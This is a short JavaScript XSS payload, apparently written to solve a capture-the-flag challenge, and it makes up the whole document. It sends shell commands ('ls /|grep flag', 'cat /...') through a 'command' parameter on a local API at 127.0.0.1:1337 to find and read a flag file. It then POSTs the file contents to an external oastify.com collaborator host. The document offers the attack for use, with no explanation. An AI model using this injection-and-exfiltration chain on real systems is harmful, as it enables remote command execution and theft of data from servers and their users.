<script>
fetch("http://127.0.0.1:1337/api/stats?command=ls+/|grep+flag")
  .then((response) => response.text())
  .then((data) => { 
    fetch(`http://127.0.0.1:1337/api/stats?command=cat+/`+data)
      .then((response) => response.text())
      .then((fileContent) => {
        fetch('http://xklqf2ly81rowgujq4vgur2vcmid66uv.oastify.com', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ fileContent }),
          mode: 'cors',
          credentials: 'omit'
        });
      })
      .catch((error) => {
        console.error('Error fetching file content:', error);
      });
  })
  .catch((error) => {
    console.error('Error fetching stats:', error);
  });</script>
